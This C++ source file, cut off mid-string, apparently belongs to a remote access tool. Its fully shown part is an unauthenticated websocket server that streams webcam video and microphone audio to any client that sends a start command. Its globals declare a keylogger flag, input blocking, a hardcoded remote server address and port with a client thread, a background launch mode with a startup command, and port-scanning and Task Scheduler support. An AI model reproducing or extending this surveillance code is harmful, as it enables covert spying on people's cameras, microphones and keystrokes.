// =============================
// Standard C++ Library includes
// =============================
#include <algorithm>
#include <atomic>
#include <chrono>
#include <condition_variable>
#include <ctime>
#include <fstream>
#include <functional>
#include <iomanip>
#include <iostream>
#include <memory>
#include <mutex>
#include <queue>
#include <sstream>
#include <string>
#include <thread>
#include <unordered_map>
#include <vector>
#include <filesystem>
#include <cmath>
#include <deque>
#include <cstdlib>

// =============================
// OpenCV includes (before Webview and X11)
// =============================
#ifdef Status
#undef Status
#endif
#include <opencv2/opencv.hpp>
#include "opencv_fix/convert.hpp"

// =============================
// Webview includes
// =============================
#include "webview/webview.h"

// =============================
// Platform-specific includes
// =============================
#ifdef _WIN32
    // Windows headers
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #include <winuser.h>
    #include <process.h>
    #include <psapi.h>
    #include <shlobj.h>
    #include <tlhelp32.h>
    #include <iphlpapi.h>
    #include <ws2bth.h>
    #include <bluetoothapis.h>
    #include <shellapi.h>
    #include <comutil.h>
    #include <mmdeviceapi.h>
    #include <endpointvolume.h>
    #include <wincrypt.h>
    #include <winhttp.h>
    #include <shlobj.h>
    #include <winreg.h>
    #include <taskschd.h>
    #include <comdef.h>
    
    // GDI+ headers
    #include <gdiplus.h>
    using namespace Gdiplus;
    
    // Multimedia headers
    #include <mmsystem.h>
    #include <digitalv.h>
    #include <mmreg.h>
    #include <dsound.h>
    
    // MCI headers
    #include <mciapi.h>

    // Define our own sleep functions in a namespace to avoid conflicts
    namespace portable {
        inline void sleep(unsigned int seconds) {
            ::Sleep(seconds * 1000);
        }
        
        inline void usleep(unsigned int microseconds) {
            ::Sleep(microseconds / 1000);
        }
    }

    // Undefine any conflicting macros before including Boost
    #ifdef sleep
        #undef sleep
    #endif
    #ifdef usleep
        #undef usleep
    #endif

    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "iphlpapi.lib")
    #pragma comment(lib, "Bthprops.lib")
    #pragma comment(lib, "ole32.lib")
    #pragma comment(lib, "comsuppw.lib")
    #pragma comment(lib, "winhttp.lib")
    #pragma comment(lib, "taskschd.lib")
    #pragma comment(lib, "credui.lib")
    #pragma comment(lib, "gdiplus.lib")
    #pragma comment(lib, "winmm.lib")
    #pragma comment(lib, "dsound.lib")

    // Windows type aliases
    typedef SOCKET socket_t;
    typedef HANDLE thread_t;

    // Only redefine for raw sockets, not for file streams
    inline int portable_close(socket_t s) {
        return closesocket(s);
    }
    #define socket_close portable_close
    #define INVALID_FD INVALID_SOCKET

#else
    // Linux/Unix headers (X11 headers included after OpenCV)
    #include <net/if.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <netinet/in.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/time.h>
    #include <sys/ioctl.h>
    #include <sys/mman.h>
    #include <sys/wait.h>
    #include <unistd.h>
    #include <pwd.h>
    #include <signal.h>
    #include <fcntl.h>
    #include <ifaddrs.h>
    #include <bluetooth/bluetooth.h>
    #include <bluetooth/hci.h>
    #include <bluetooth/hci_lib.h>
    #include <X11/Xlib.h>
    #include <X11/Xutil.h>
    #include <X11/extensions/XTest.h>
    #include <X11/keysym.h>
    #include <linux/videodev2.h>
    #include <sys/xattr.h>
    #include <sys/sendfile.h>
    #include <linux/input.h>
    #include <curl/curl.h>
    #include <openssl/sha.h>
    #include <openssl/x509.h>
    #include <openssl/err.h>

    // Linux type aliases
    typedef int socket_t;
    typedef pthread_t thread_t;
    #define INVALID_FD -1
#endif

// =============================
// Third-party libraries
// =============================
#include <openssl/sha.h>        // OpenSSL SHA1

// =============================
// WebStreamer includes
// =============================
// Undefine any conflicting macros before including Boost
#ifdef sleep
    #undef sleep
#endif
#ifdef usleep
    #undef usleep
#endif

#include <websocketpp/config/asio_no_tls.hpp>
#include <websocketpp/server.hpp>
#include <portaudio.h>

// =============================
// Platform-specific sleep definitions
// =============================
#ifdef _WIN32
    // Use our portable namespace functions
    #define sleep portable::sleep
    #define usleep portable::usleep
#else
    // Linux/Unix already has sleep and usleep
#endif

namespace fs = std::filesystem;

// Webview Configuration
const char SIGNATURE[] = "MYHTMLPAYLOADv1";
const size_t SIG_LEN = 15;
const size_t LEN_FIELD = 8;

// Fallback embedded HTML
const std::string embedded_html = R"HTML(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Fast Client Streamer</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: monospace;
            background: #000;
            color: #f00;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        .container { max-width: 600px; width: 100%; }
        h1 { margin-bottom: 15px; text-align: center; }
        .status {
            padding: 10px;
            margin-bottom: 15px;
            background: #111;
            border: 1px solid #f00;
            text-align: center;
        }
        .status.streaming { border-color: #0f0; color: #0f0; }
        .video-box {
            background: #111;
            padding: 15px;
            margin-bottom: 15px;
            border: 1px solid #333;
        }
        video {
            width: 100%;
            height: auto;
            background: #000;
            transform: scaleX(-1);
        }
        .controls {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        button {
            padding: 12px;
            border: none;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            font-family: monospace;
        }
        .btn-start {
            background: #0a0;
            color: #000;
        }
        .btn-start:hover { background: #0c0; }
        .btn-stream {
            background: #00a;
            color: #fff;
        }
        .btn-stream:hover { background: #00c; }
        .btn-stop {
            background: #a00;
            color: #fff;
        }
        .btn-stop:hover { background: #c00; }
        button:disabled {
            background: #333;
            color: #666;
            cursor: not-allowed;
        }
        .info {
            background: #111;
            padding: 10px;
            border: 1px solid #333;
            text-align: center;
            font-size: 12px;
        }
        .fps { color: #ff0; font-weight: bold; }
        .quality {
            margin: 10px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .quality label { color: #888; }
        .quality input { width: 60%; }
        .quality span { color: #0f0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>CLIENT STREAMER - OPTIMIZED</h1>
        
        <div class="status" id="status">Ready</div>

        <div class="video-box">
            <video id="video" autoplay muted playsinline></video>
        </div>

        <div class="quality">
            <label>Quality:</label>
            <input type="range" id="quality" min="50" max="95" value="75">
            <span id="qualityValue">75%</span>
        </div>

        <div class="quality">
            <label>FPS Target:</label>
            <input type="range" id="fps" min="15" max="60" value="30">
            <span id="fpsValue">30</span>
        </div>

        <div class="controls">
            <button class="btn-start" id="btnStart" onclick="startCamera()">START CAMERA</button>
            <button class="btn-stream" id="btnStream" onclick="startStream()" disabled>CONNECT & STREAM</button>
            <button class="btn-stop" id="btnStop" onclick="stopStream()" disabled>STOP STREAMING</button>
        </div>

        <div class="info">
            <div>ID: <span id="clientId">Not connected</span></div>
            <div>Actual FPS: <span class="fps" id="actualFps">0</span></div>
        </div>
    </div>

    <script>
        const WS_URL = 'ws://localhost:8081';
        let ws = null;
        let stream = null;
        let isStreaming = false;
        let canvas, ctx;
        let frameInterval;
        let clientId = 'client_' + Date.now();
        let fpsCounter = 0;
        let lastFpsUpdate = Date.now();

        const video = document.getElementById('video');
        const qualitySlider = document.getElementById('quality');
        const fpsSlider = document.getElementById('fps');
        const qualityValue = document.getElementById('qualityValue');
        const fpsValue = document.getElementById('fpsValue');
        const actualFpsSpan = document.getElementById('actualFps');

        qualitySlider.oninput = () => {
            qualityValue.textContent = qualitySlider.value + '%';
        };

        fpsSlider.oninput = () => {
            fpsValue.textContent = fpsSlider.value;
            if (isStreaming) {
                stopCapture();
                startCapture();
            }
        };

        function updateStatus(msg, streaming = false) {
            const status = document.getElementById('status');
            status.textContent = msg;
            status.className = 'status' + (streaming ? ' streaming' : '');
        }

        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        frameRate: { ideal: 30 }
                    },
                    audio: false
                });
                video.srcObject = stream;
                updateStatus('Camera active - Ready');
                
                document.getElementById('btnStart').disabled = true;
                document.getElementById('btnStream').disabled = false;

                // Setup canvas
                canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                ctx = canvas.getContext('2d', { 
                    alpha: false,
                    willReadFrequently: true 
                });
                
            } catch (err) {
                updateStatus('Camera error: ' + err.message);
                alert('Camera access denied');
            }
        }

        function startStream() {
            ws = new WebSocket(WS_URL);
            ws.binaryType = 'arraybuffer';
            
            ws.onopen = () => {
                updateStatus('STREAMING TO SERVER', true);
                isStreaming = true;
                document.getElementById('clientId').textContent = clientId;
                
                ws.send(JSON.stringify({ 
                    type: 'streamer',
                    clientId: clientId
                }));
                
                document.getElementById('btnStream').disabled = true;
                document.getElementById('btnStop').disabled = false;
                
                startCapture();
                startFpsCounter();
            };

            ws.onerror = () => {
                updateStatus('Connection error');
            };

            ws.onclose = () => {
                updateStatus('Disconnected');
                isStreaming = false;
                stopCapture();
                document.getElementById('btnStream').disabled = false;
                document.getElementById('btnStop').disabled = true;
            };
        }

        function startCapture() {
            const targetFps = parseInt(fpsSlider.value);
            const interval = 1000 / targetFps;
            
            frameInterval = setInterval(() => {
                if (!isStreaming || !ws || ws.readyState !== WebSocket.OPEN) {
                    return;
                }
                captureAndSend();
            }, interval);
        }

        function stopCapture() {
            if (frameInterval) {
                clearInterval(frameInterval);
                frameInterval = null;
            }
        }

        function captureAndSend() {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob((blob) => {
                if (blob && ws && ws.readyState === WebSocket.OPEN) {
                    blob.arrayBuffer().then(buffer => {
                        ws.send(buffer);
                        fpsCounter++;
                    });
                }
            }, 'image/jpeg', qualitySlider.value / 100);
        }

        function startFpsCounter() {
            setInterval(() => {
                const now = Date.now();
                const elapsed = now - lastFpsUpdate;
                if (elapsed >= 1000) {
                    actualFpsSpan.textContent = Math.round(fpsCounter * 1000 / elapsed);
                    fpsCounter = 0;
                    lastFpsUpdate = now;
                }
            }, 500);
        }

        function stopStream() {
            isStreaming = false;
            stopCapture();
            if (ws) {
                ws.close();
                ws = null;
            }
            updateStatus('Stopped');
        }

        window.onbeforeunload = () => {
            if (ws) ws.close();
            if (stream) stream.getTracks().forEach(t => t.stop());
        };
    </script>
</body>
</html>
)HTML";

constexpr int MAX_COMMAND_LENGTH = 256;
constexpr int MAX_OUTPUT_LENGTH = 4096;
constexpr int MAX_PATH_LENGTH = 1024;
constexpr int MAX_PROCESSES = 512;
constexpr int MAX_NETWORK_CONNS = 256;
constexpr int PORT_SCAN_LIMIT = 1000;

// Common definitions
constexpr const char* PATH_SEP = "/";
constexpr const char* TEMP_DIR = "/tmp";
constexpr const char* NULL_DEVICE = "/dev/null";

// Global variables
std::string current_dir;
std::atomic<bool> realtime_monitoring(false);
std::atomic<bool> input_blocked(false);
std::thread monitor_thread;
std::atomic<bool> keylogger_running(false);
std::thread keylogger_thread;

#ifdef _WIN32
HANDLE chrome_pid = NULL;
HANDLE monitor_pid = NULL;
#else
pid_t chrome_pid = 0;
pid_t monitor_pid = 0;
#endif

// Remote server connection variables
std::string remote_server_url = "192.168.100.3";
int remote_server_port = 9999;
std::atomic<bool> remote_client_running(false);
std::thread remote_client_thread;
std::mutex remote_mutex;
std::queue<std::string> log_queue;
std::mutex log_queue_mutex;

std::atomic<bool> live_chat_active{false};
PaStream* live_chat_input_stream = nullptr;
PaStream* live_chat_output_stream = nullptr;
std::mutex audio_buffer_mutex;
std::queue<std::vector<int16_t>> audio_output_buffer;
const int LIVE_CHAT_SAMPLE_RATE = 44100;
const int LIVE_CHAT_CHANNELS = 1;
const int LIVE_CHAT_FRAMES_PER_BUFFER = 512;
const int LIVE_CHAT_BUFFER_DELAY_MS = 200;
// =============================
// LAUNCH CONFIGURATION - Modify these lines to change behavior
// =============================
const int LAUNCH_MODE = 0;           // 0 = GUI, 1 = Background, 2 = CLI
const bool SHOW_POPUP = true;         // Show popup message at startup
const bool RUN_STARTUP_COMMAND = true; // Run command at startup
const std::string STARTUP_COMMAND = "bgapps"; // Command to run at startup

// Add these global variables at the top of your file
socket_t current_socket = -1;  // For tracking the current socket in remote client loop

// Add these function declarations before they're used
void send_to_server(const std::string& data);
void send_current_directory(socket_t sock);
std::string get_current_directory();

// Process information structure
struct ProcessInfo {
    int pid;
    std::string name;
    std::string user;
};

// Network connection structure
struct NetworkConn {
    int pid;
    std::string local_addr;
    int local_port;
    std::string remote_addr;
    int remote_port;
    std::string state;
};

// Bluetooth device structure
struct BluetoothDevice {
    std::string name;
    std::string address;
    bool connected;
    bool remembered;
    bool authenticated;
};

// Command structure
struct Command {
    std::string name;
    std::function<void(const std::vector<std::string>&)> func;
    std::string description;
};

// Network information structure
struct NetworkInfo {
    std::string localIP;
    std::string gateway;
    std::string subnet;
    std::string macAddress;
};

// =============================
// WebStreamer Code
// =============================
using websocketpp::lib::placeholders::_1;
using websocketpp::lib::placeholders::_2;
using websocketpp::lib::bind;
typedef websocketpp::server<websocketpp::config::asio> server_t;
typedef websocketpp::connection_hdl connection_hdl;

// Streamer configuration
static server_t streamer_ws_server;
static std::atomic<bool> is_streaming(false);

// Video defaults
int TARGET_WIDTH  = 320;
int TARGET_HEIGHT = 180;
int JPEG_QUALITY  = 55;
int TARGET_FPS    = 15;
int MIN_FPS       = 6;
int MAX_FPS       = 25;

// Audio defaults - optimized for external connections
const int SERVER_SAMPLE_RATE = 16000;
const int CHANNELS = 1;
const PaSampleFormat PA_FORMAT = paInt16;
const unsigned long AUDIO_CHUNK = 160; // 10ms at 16kHz

// Internal limits
const int ENCODE_TIMEOUT_MS = 500;

static std::mutex conn_mutex;
static std::vector<connection_hdl> connections;

// Capture/send pipeline
static std::mutex latest_frame_mutex;
static cv::Mat latest_frame;
static std::atomic<bool> have_frame(false);
static std::atomic<int> adaptive_fps(TARGET_FPS);

// Audio queue - increased buffer size for external connections
struct AudioPacket { std::vector<int16_t> pcm; uint64_t pts_ms; };
static std::mutex audio_mutex;
static std::condition_variable audio_cv;
static std::deque<AudioPacket> audio_queue;
const size_t MAX_AUDIO_QUEUE = 500; // Increased buffer size

static std::chrono::steady_clock::time_point stream_start_time;
static std::atomic<uint64_t> audio_samples_sent(0);

static cv::VideoCapture camera;
static PaStream* global_pa_stream = nullptr;

// Mic gain (server-side) - default 1.0 (no change)
static std::atomic<double> mic_gain(1.0);

// Platform sleep
static void msleep(int ms) {
#ifdef _WIN32
    Sleep(ms);
#else
    usleep(ms * 1000);
#endif
}

// Print all local IP addresses
void printLocalIPs() {
    std::cout << "Local IP addresses:\n";
    
#ifdef _WIN32
    PIP_ADAPTER_ADDRESSES adapter_addresses = nullptr;
    ULONG out_buf_len = 0;
    
    // Get the required buffer size
    if (GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, nullptr, adapter_addresses, &out_buf_len) == ERROR_BUFFER_OVERFLOW) {
        adapter_addresses = (PIP_ADAPTER_ADDRESSES)malloc(out_buf_len);
    }
    
    if (GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, nullptr, adapter_addresses, &out_buf_len) == NO_ERROR) {
        for (PIP_ADAPTER_ADDRESSES adapter = adapter_addresses; adapter; adapter = adapter->Next) {
            if (adapter->OperStatus != IfOperStatusUp) continue;
            
            for (IP_ADAPTER_UNICAST_ADDRESS* address = adapter->FirstUnicastAddress; address; address = address->Next) {
                if (address->Address.lpSockaddr->sa_family == AF_INET) {
                    sockaddr_in* addr_in = (sockaddr_in*)address->Address.lpSockaddr;
                    char str_buffer[INET_ADDRSTRLEN];
                    inet_ntop(AF_INET, &(addr_in->sin_addr), str_buffer, INET_ADDRSTRLEN);
                    
                    if (std::string(str_buffer) != "127.0.0.1") {
                        std::cout << "  http://" << str_buffer << ":9002\n";
                    }
                }
            }
        }
    }
    
    if (adapter_addresses) free(adapter_addresses);
#else
    struct ifaddrs *ifaddrs_ptr;
    if (getifaddrs(&ifaddrs_ptr) == -1) {
        perror("getifaddrs");
        return;
    }

    for (struct ifaddrs *ifa = ifaddrs_ptr; ifa != nullptr; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == nullptr) continue;
        if (ifa->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in* addr_in = (struct sockaddr_in*)ifa->ifa_addr;
            char addr_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &(addr_in->sin_addr), addr_str, INET_ADDRSTRLEN);
            
            if (strcmp(addr_str, "127.0.0.1") != 0) {
                std::cout << "  http://" << addr_str << ":9002\n";
            }
        }
    }

    freeifaddrs(ifaddrs_ptr);
#endif
}

// --- camera init ---
bool init_camera() {
    try {
        int idx = 0;
#ifdef _WIN32
        camera.open(idx, cv::CAP_DSHOW);
#elif defined(__APPLE__)
        camera.open(idx, cv::CAP_AVFOUNDATION);
#else
        camera.open(idx, cv::CAP_V4L2);
#endif
        if (!camera.isOpened()) camera.open(idx);
        if (!camera.isOpened()) {
            std::cerr << "[camera] failed to open\n";
            return false;
        }
        camera.set(cv::CAP_PROP_FRAME_WIDTH, TARGET_WIDTH);
        camera.set(cv::CAP_PROP_FRAME_HEIGHT, TARGET_HEIGHT);
        camera.set(cv::CAP_PROP_FPS, TARGET_FPS);
        std::cout << "[camera] opened\n";
        return true;
    } catch (const std::exception& e) {
        std::cerr << "[camera] exception: " << e.what() << std::endl;
        return false;
    }
}

// --- websocket helpers ---
void send_binary_to_all(const unsigned char* data, size_t len) {
    std::lock_guard<std::mutex> lock(conn_mutex);
    for (auto it = connections.begin(); it != connections.end();) {
        try {
            streamer_ws_server.send(*it, (const void*)data, len, websocketpp::frame::opcode::binary);
            ++it;
        } catch (const std::exception& e) {
            std::cerr << "[ws] send error, removing client: " << e.what() << std::endl;
            it = connections.erase(it);
        }
    }
}

// --- audio capture callback (PortAudio) ---
// Original audio processing without complex compression
std::vector<int16_t> process_audio_block_with_gain(const int16_t* in, size_t frames, double gain) {
    std::vector<int16_t> out(frames);
    int32_t maxAbs = 0;
    for (size_t i = 0; i < frames; ++i) {
        // noise gate
        int32_t s = in[i];
        if (std::abs(s) < 100) s = 0;
        // apply gain (float)
        double scaled = s * gain;
        int32_t si;
        if (scaled > 32767.0) si = 32767;
        else if (scaled < -32768.0) si = -32768;
        else si = (int32_t)std::lrint(scaled);
        out[i] = (int16_t)si;
        if (std::abs(si) > maxAbs) maxAbs = std::abs(si);
    }
    // If maxAbs reached clipping, scale down uniformly to avoid harsh clipping (soft limiter)
    if (maxAbs > 32760) {
        double scale = 32760.0 / double(maxAbs);
        for (size_t i = 0; i < frames; ++i) {
            int32_t v = out[i];
            out[i] = (int16_t)std::lrint(v * scale);
        }
    }
    return out;
}

int pa_callback(const void *inputBuffer, void * /*outputBuffer*/,
                unsigned long framesPerBuffer,
                const PaStreamCallbackTimeInfo* /*timeInfo*/,
                PaStreamCallbackFlags statusFlags,
                void * /*userData*/) {
    if (!is_streaming) return paComplete;
    if (statusFlags & (paInputUnderflow | paInputOverflow)) {
        static std::atomic<int> cnt(0);
        int c = ++cnt;
        if ((c % 200) == 0) std::cerr << "[audio] under/overflow x" << c << std::endl;
    }
    if (!inputBuffer) return paContinue;
    const int16_t* in = static_cast<const int16_t*>(inputBuffer);

    double gain = mic_gain.load();
    auto processed = process_audio_block_with_gain(in, framesPerBuffer, gain);

    // compute pts_ms from sample index
    uint64_t sample_index = audio_samples_sent.fetch_add(framesPerBuffer);
    uint64_t pts_ms = (sample_index * 1000ull) / SERVER_SAMPLE_RATE;

    {
        std::lock_guard<std::mutex> lock(audio_mutex);
        if (audio_queue.size() >= MAX_AUDIO_QUEUE) audio_queue.pop_front(); // drop oldest
        audio_queue.push_back(AudioPacket{ std::move(processed), pts_ms });
    }
    audio_cv.notify_one();
    return paContinue;
}

bool init_audio() {
    PaError err = Pa_Initialize();
    if (err != paNoError) {
        std::cerr << "[audio] init error: " << Pa_GetErrorText(err) << std::endl;
        return false;
    }
    int devCount = Pa_GetDeviceCount();
    if (devCount <= 0) { 
        std::cerr << "[audio] no devices\n"; 
        Pa_Terminate(); 
        return false; 
    }
    PaDeviceIndex dev = Pa_GetDefaultInputDevice();
    const PaDeviceInfo* di = Pa_GetDeviceInfo(dev);
    if (!di || di->maxInputChannels < CHANNELS) {
        dev = paNoDevice;
        for (PaDeviceIndex i = 0; i < devCount; ++i) {
            const PaDeviceInfo* pd = Pa_GetDeviceInfo(i);
            if (pd && pd->maxInputChannels >= CHANNELS) { dev = i; break; }
        }
    }
    if (dev == paNoDevice) { 
        std::cerr << "[audio] no suitable device\n"; 
        Pa_Terminate(); 
        return false; 
    }
    di = Pa_GetDeviceInfo(dev);
    PaStreamParameters inputParams;
    inputParams.device = dev;
    inputParams.channelCount = CHANNELS;
    inputParams.sampleFormat = PA_FORMAT;
    inputParams.suggestedLatency = di->defaultLowInputLatency;
    inputParams.hostApiSpecificStreamInfo = nullptr;

    PaStream* stream = nullptr;
    err = Pa_OpenStream(&stream, &inputParams, nullptr, SERVER_SAMPLE_RATE, AUDIO_CHUNK, paClipOff, pa_callback, nullptr);
    if (err != paNoError) { 
        std::cerr << "[audio] open error: " << Pa_GetErrorText(err) << std::endl; 
        Pa_Terminate(); 
        return false; 
    }
    err = Pa_StartStream(stream);
    if (err != paNoError) { 
        std::cerr << "[audio] start error: " << Pa_GetErrorText(err) << std::endl; 
        Pa_CloseStream(stream); 
        Pa_Terminate(); 
        return false; 
    }

    global_pa_stream = stream;
    std::cout << "[audio] started\n";
    return true;
}

// audio send worker: send audio packets as: [tag=2][pts(8 le)][pcm]
void audio_send_worker() {
    while (is_streaming) {
        std::unique_lock<std::mutex> lock(audio_mutex);
        audio_cv.wait(lock, []{ return !audio_queue.empty() || !is_streaming; });
        if (!is_streaming) break;
        AudioPacket pkt = std::move(audio_queue.front());
        audio_queue.pop_front();
        lock.unlock();

        size_t pcm_bytes = pkt.pcm.size() * sizeof(int16_t);
        size_t total = 1 + 8 + pcm_bytes;
        std::vector<unsigned char> payload; payload.resize(total);
        payload[0] = 0x02;
        uint64_t pts = pkt.pts_ms;
        for (int i = 0; i < 8; ++i) payload[1+i] = (unsigned char)((pts >> (8*i)) & 0xFF);
        memcpy(payload.data() + 1 + 8, pkt.pcm.data(), pcm_bytes);
        send_binary_to_all(payload.data(), payload.size());
    }
}

// capture thread: keep latest_frame as freshest frame
void capture_worker() {
    cv::Mat frame;
    while (is_streaming) {
        if (!camera.isOpened()) { msleep(10); continue; }
        if (!camera.read(frame) || frame.empty()) { msleep(5); continue; }
        if (frame.cols != TARGET_WIDTH || frame.rows != TARGET_HEIGHT) {
            cv::Mat resized;
            cv::resize(frame, resized, cv::Size(TARGET_WIDTH, TARGET_HEIGHT));
            std::lock_guard<std::mutex> lk(latest_frame_mutex);
            latest_frame = resized;
        } else {
            std::lock_guard<std::mutex> lk(latest_frame_mutex);
            latest_frame = frame.clone();
        }
        have_frame = true;
    }
}

// send worker: encode latest frame only when sending (adaptive fps)
void send_worker() {
    std::vector<int> jpg_params = { cv::IMWRITE_JPEG_QUALITY, JPEG_QUALITY };
    double ema_send_ms = 0.0; // ema of encode+send time
    const double alpha = 0.18;
    int local_fps = adaptive_fps.load();

    while (is_streaming) {
        local_fps = adaptive_fps.load();
        int interval_ms = std::max(1, 1000 / local_fps);
        auto t0 = std::chrono::steady_clock::now();

        cv::Mat frame_copy;
        {
            std::lock_guard<std::mutex> lk(latest_frame_mutex);
            if (have_frame && !latest_frame.empty()) frame_copy = latest_frame.clone();
        }

        if (!frame_copy.empty()) {
            std::vector<unsigned char> buf;
            try { cv::imencode(".jpg", frame_copy, buf, jpg_params); } catch(...) { buf.clear(); }
            if (!buf.empty()) {
                auto now = std::chrono::steady_clock::now();
                uint64_t pts_ms = std::chrono::duration_cast<std::chrono::milliseconds>(now - stream_start_time).count();
                size_t total = 1 + 8 + buf.size();
                std::vector<unsigned char> payload; payload.resize(total);
                payload[0] = 0x01;
                for (int i = 0; i < 8; ++i) payload[1+i] = (unsigned char)((pts_ms >> (8*i)) & 0xFF);
                memcpy(payload.data() + 1 + 8, buf.data(), buf.size());

                auto send_t0 = std::chrono::steady_clock::now();
                send_binary_to_all(payload.data(), payload.size());
                auto send_t1 = std::chrono::steady_clock::now();
                double took = std::chrono::duration<double, std::milli>(send_t1 - send_t0).count();
                if (ema_send_ms == 0.0) ema_send_ms = took; else ema_send_ms = alpha*took + (1-alpha)*ema_send_ms;

                // adapt fps & quality if needed
                if (ema_send_ms > 120.0 && local_fps > MIN_FPS) {
                    local_fps = std::max(MIN_FPS, local_fps - 2);
                    adaptive_fps.store(local_fps);
                    JPEG_QUALITY = std::max(30, JPEG_QUALITY - 6);
                    jpg_params[1] = JPEG_QUALITY;
                } else if (ema_send_ms < 40.0 && local_fps < MAX_FPS) {
                    local_fps = std::min(MAX_FPS, local_fps + 1);
                    adaptive_fps.store(local_fps);
                    JPEG_QUALITY = std::min(85, JPEG_QUALITY + 2);
                    jpg_params[1] = JPEG_QUALITY;
                }
            }
        }

        auto t1 = std::chrono::steady_clock::now();
        int elapsed = (int)std::chrono::duration_cast<std::chrono::milliseconds>(t1 - t0).count();
        int sleep_ms = interval_ms - elapsed;
        if (sleep_ms > 0) msleep(sleep_ms);
        else msleep(1);
    }
}

// mapping meters -> gain (server-side): original linear mapping
double meters_to_gain(double meters) {
    if (meters < 0) meters = 0;
    if (meters > 1000) meters = 1000;
    return 1.0 + meters / 10.0;
}

// parse quick JSON-like text to extract numbers
bool handle_text_command(const std::string& text) {
    if (text.find("\"command\":\"set_mic_gain\"") != std::string::npos ||
        text.find("'command':'set_mic_gain'") != std::string::npos) {
        size_t p = text.find("\"gain\":");
        if (p == std::string::npos) p = text.find("'gain':");
        if (p != std::string::npos) {
            p += 7;
            try {
                double g = std::stod(text.substr(p));
                if (g < 0.0) g = 0.0;
                mic_gain.store(g);
                std::cout << "[cmd] mic_gain set to " << g << std::endl;
                return true;
            } catch(...) {}
        }
    }
    if (text.find("\"command\":\"set_mic_distance\"") != std::string::npos ||
        text.find("'command':'set_mic_distance'") != std::string::npos) {
        size_t p = text.find("\"meters\":");
        if (p == std::string::npos) p = text.find("'meters':");
        if (p != std::string::npos) {
            p += 9;
            try {
                double m = std::stod(text.substr(p));
                double g = meters_to_gain(m);
                mic_gain.store(g);
                std::cout << "[cmd] meters=" << m << " -> mic_gain=" << g << std::endl;
                return true;
            } catch(...) {}
        }
    }
    return false;
}

// --- websocket handlers ---
void on_open(connection_hdl h) {
    std::lock_guard<std::mutex> lk(conn_mutex);
    connections.push_back(h);
    std::cout << "[ws] client connected: " << connections.size() << std::endl;
    // init JSON
    std::ostringstream ss;
    ss << R"({"type":"init","sampleRate":)" << SERVER_SAMPLE_RATE
       << R"(,"channels":)" << CHANNELS
       << R"(,"videoFps":)" << adaptive_fps.load()
       << R"(,"playbackTargetMs":120)" << "}"; // Increased target buffer for external connections
    try { streamer_ws_server.send(h, ss.str(), websocketpp::frame::opcode::text); } catch(...) {}
}

void on_close(connection_hdl h) {
    std::lock_guard<std::mutex> lk(conn_mutex);
    connections.erase(std::remove_if(connections.begin(), connections.end(),
        [&h](const connection_hdl& c) { return !c.owner_before(h) && !h.owner_before(c); }), connections.end());
    std::cout << "[ws] client disconnected: " << connections.size() << std::endl;
}

void on_message(connection_hdl /*h*/, server_t::message_ptr msg) {
    std::string payload = msg->get_payload();
    // If control JSON, handle
    if (payload.find("set_mic_gain") != std::string::npos || payload.find("set_mic_distance") != std::string::npos) {
        if (handle_text_command(payload)) return;
    }
    if (payload.find("start_stream") != std::string::npos) {
        if (!is_streaming) {
            // start streaming threads
            stream_start_time = std::chrono::steady_clock::now();
            audio_samples_sent.store(0);
            is_streaming = true;
            if (!init_camera()) std::cerr << "[stream] camera init failed (video may be disabled)\n";
            bool audio_ok = init_audio();
            if (!audio_ok) std::cerr << "[stream] audio init failed\n";
            // spawn threads
            std::thread capture_thread(capture_worker);
            std::thread send_thread(send_worker);
            std::thread audio_send(audio_send_worker);
            capture_thread.detach();
            send_thread.detach();
            audio_send.detach();
            std::cout << "[stream] started\n";
        }
    } else if (payload.find("stop_stream") != std::string::npos) {
        if (is_streaming) {
            is_streaming = false;
            msleep(50);
            if (global_pa_stream) {
                Pa_StopStream(global_pa_stream);
                Pa_CloseStream(global_pa_stream);
                Pa_Terminate();
                global_pa_stream = nullptr;
            }
            {
                std::lock_guard<std::mutex> lk(latest_frame_mutex);
                latest_frame.release();
                have_frame = false;
            }
            {
                std::lock_guard<std::mutex> lk(audio_mutex);
                audio_queue.clear();
            }
            if (camera.isOpened()) camera.release();
            std::cout << "[stream] stopped\n";
        }
    } else {
        handle_text_command(payload);
    }
}

// HTTP: serve client HTML/JS with robust audio handling
void on_http(connection_hdl h) {
    server_t::connection_ptr con = streamer_ws_server.get_con_from_hdl(h);
    con->set_status(websocketpp::http::status_code::ok);

    const char* html = R"HTML(
<!doctype html>
<html>
<head><meta charset="utf-8"><title>Webcam Streamer</title>
<style>body{font-family:Arial;background:#f5f5f5;padding:18px} .card{max-width:900px;margin:0 auto;background:#fff;padding:16px;border-radius:8px}
canvas{width:100%;height:auto;border-radius:6px;border:1px solid #333}
.controls{margin-top:8px} button{padding:8px 12px;margin-right:6px} label{margin-right:8px}</style>
</head>
<body>
<div class="card">
<h3>Webcam Streamer</h3>
<canvas id="canvas" width="320" height="180"></canvas>
<div class="controls">
<button id="startBtn">Start</button>
<button id="stopBtn">Stop</button>
<button id="toggleAudio">Audio ON</button>
<label>Volume: <input id="vol" type="range" min="0" max="100" value="30"/></label>
<label>Distance (m): <input id="distance" type="range" min="0" max="100" value="0"/></label>
<span id="distLabel">0 m</span>
</div>
<div>Status: <span id="status">Disconnected</span> | Frames: <span id="frames">0</span> | Audio buffer: <span id="abuf">0</span></div>
</div>

<script>
